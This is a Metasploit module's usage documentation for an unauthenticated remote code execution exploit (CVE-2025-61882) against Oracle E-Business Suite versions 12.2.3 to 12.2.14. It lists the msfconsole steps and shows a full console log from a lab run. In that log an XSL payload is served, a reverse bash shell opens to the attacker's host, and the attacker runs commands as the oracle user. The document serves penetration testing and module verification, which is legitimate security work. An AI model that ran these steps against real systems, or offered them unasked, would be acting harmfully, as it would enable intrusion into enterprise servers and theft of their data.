## Vulnerable Application
This module exploits CVE-2025-61882, a critical Remote Code Execution (RCE) vulnerability in Oracle E-Business Suite (EBS).
The flaw allows unauthenticated attackers to execute arbitrary code by leveraging a combination of SSRF, HTTP request smuggling and XSLT injection.
- **CVSS Score**: 9.8 Critical
- **Affected Versions**: Oracle E-Business Suite, versions 12.2.3-12.2.14
- **Tested On**: Oracle EBS 12.2.12 (Linux host)

## Testing

- App images files are available on Oracle website (Oracle Software Delivery Cloud)
- You can follow this [setup guide for Oracle EBS](https://web.archive.org/web/20230203132732/https://blog.rishoradev.com/2021/04/12/oracle-ebs-r12-on-virtualbox)

**Note**: 300 Go are required and a few hours for the inital image creation

## Verification Steps
1. Start msfconsole
2. `use exploit/multi/http/oracle_ebs_cve_2025_61882_exploit_rce`
3. `set RHOST <TARGET_IP_ADDRESS>`
4.  set file serving port `set SRVPORT 1337`
5. `set PAYLOAD (default is cmd/unix/reverse_bash)`
6. `set LHOST <YOUR_ATTACKER_IP>`
7. `set LPORT 4444`
8. `check`
9. `exploit`

## Scenarios

### Linux Command

```
use exploit/multi/http/oracle_ebs_cve_2025_61882_exploit_rce

msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > set SRVPORT 1337
SRVPORT => 1337
msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > set RHOSTS 192.168.56.104
RHOSTS => 192.168.56.104

show options

Module options (exploit/multi/http/oracle_ebs_cve_2025_61882_exploit_rce):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   HTTP_TIMEOUT   20               yes       Time to wait for target to fetch XSL (seconds)
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         192.168.56.104   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          8000             yes       The target port (TCP)
   SHELL_TIMEOUT  30               yes       Time to wait for shell after XSL delivery (seconds)
   SRVHOST        0.0.0.0          yes       The local host to listen on for XSL callback
   SRVPORT        1337             yes       The local port to listen on for XSL callback
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI      /                yes       Base path to Oracle EBS
   URIPATH                         no        The URI to use for this exploit (default is random)
   VHOST                           no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.1     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux/Unix (Interactive Shell)


msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > check
[*] 192.168.56.104:8000 - The target appears to be vulnerable.


msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > exploit
[*] Exploit running as background job 7.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] Starting HTTP server on 0.0.0.0:1337
[*] Using URL: http://192.168.56.1:1337/
[*] XSL payload will be served at: http://192.168.56.1:1337/HexdwvgO.xsl
[*] Retrieving CSRF token from target...
[+] CSRF token retrieved: 86AJ-2RR3-XDNC-U9I4-Y...
[*] Creating HTTP request smuggling payload...
[*] Triggering exploitation via UiServlet...
[+] Received request: GET /OA_HTML/ieshostedsurvey.xsl from 192.168.56.104:63162
[+] Serving  XSL payload to 192.168.56.104...
[+] XSL payload delivered successfully to 192.168.56.104 (1460 bytes)
[*] Keeping HTTP server alive, waiting for callback to 192.168.56.1:4444...
[*] (Press Ctrl-C to stop)
[*] Waiting up to 30 seconds for reverse shell connection...
[+] Session created successfully!
[*] Server stopped.
[*] Command shell session 7 opened (192.168.56.1:4444 -> 192.168.56.104:61062) at 2025-12-05 09:14:42 +0100
sessions 7
[*] Starting interaction with 7...

id
uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=system_u:system_r:initrc_t:s0
uname -a
Linux apps 5.4.17-2136.338.4.2.el7uek.x86_64 #3 SMP Mon Dec 23 14:42:43 PST 2024 x86_64 x86_64 x86_64 GNU/Linux
pwd
/u01/install/APPS/fs1/FMW_Home/user_projects/domains/EBS_domain

```
